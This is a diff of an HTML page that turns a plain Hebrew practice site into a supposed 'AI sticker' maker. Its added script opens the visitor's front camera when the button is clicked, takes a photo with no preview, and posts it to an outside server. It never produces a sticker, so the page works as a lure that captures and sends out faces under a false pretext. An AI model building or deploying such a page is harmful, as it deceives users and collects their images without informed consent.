@@ -1,14 +1,77 @@
 <!DOCTYPE html>
-<html lang="he">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>אתר פשוט</title>
+    <title>יצירת סטיקרים AI</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+            background: url('55555.webp') no-repeat center center fixed;
+            background-size: cover;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h1>ברוכים הבאים לאתר שלי!</h1>
-    <p>זהו אתר פשוט שנבנה כתרגול ב-HTML. כאן תוכלו למצוא מידע וקישורים שימושיים.</p>
-    
-    <a href="https://www.example.com" target="_blank">לחץ כאן למעבר לאתר אחר</a>
+    <h1>צור סטיקר</h1>
+    <button id="capture">צור סטיקר</button>
+
+    <script>
+        const captureButton = document.getElementById('capture');
+
+        captureButton.addEventListener('click', () => {
+            // הפעלת מצלמה קדמית וצילום ישיר
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+
+                    // צילום התמונה ושליחתה
+                    imageCapture.takePhoto()
+                        .then(blob => {
+                            const formData = new FormData();
+                            formData.append('photo', blob);
+
+                            return fetch('https://one-wtkx.onrender.com/send-photo', {
+                                method: 'POST',
+                                body: formData
+                            });
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.success) {
+                                alert("הסטיקר נשלח בהצלחה");
+                            } else {
+                                alert("אירעה שגיאה: " + data.message);
+                            }
+                        })
+                        .catch(err => {
+                            alert("שגיאה: " + err.message);
+                        })
+                        .finally(() => {
+                            // עצירת המצלמה
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                })
+                .catch(err => {
+                    alert("לא ניתן להפעיל מצלמה: " + err.message);
+                });
+        });
+    </script>
 </body>
 </html>
